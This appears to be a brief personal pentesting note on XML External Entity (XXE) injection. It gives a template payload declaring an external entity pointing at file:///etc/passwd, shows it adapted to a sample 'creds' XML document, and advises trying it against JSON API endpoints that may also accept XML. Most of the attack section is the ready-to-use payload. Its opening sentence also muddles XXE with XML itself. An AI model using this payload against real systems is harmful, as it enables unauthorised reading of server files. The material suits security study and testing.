some websites are Using XML to transfer data, XXE is a simple way of representing data. an external entity is a custom entity whos definition is outside the doc's hence it will need to be located when the xml is passed. 


there will be comparing that you need to do

Normal XML

```
kali@kali ~> cat normal.xml
<?xml version="1.0"?>
<creds>
	<user>username</user>
	<password>password</password>
</creds>

```


Unedited Payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE CHANGEME [  
  <!ELEMENT CHANGEME ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <CHANGEME>&xxe;</CHANGEME>
```

Of course all of the `CHANGEME` are there because you are supposed to change them... wowww insane I know right?, change them to the attributes used in the XML given 

edited payload


```
kali@kali ~> cat test2.xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE creds [
  <!ELEMENT creds ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
	<user>&xxe;</user>
	<password>password</password>
</creds>

```

Will require a little bit of troubleshooting, this is def worth using if you see XML

Worth sending to API endpoints that expect json as sometimes they will accept XML and sometimes you will find it is vulnerable to XML
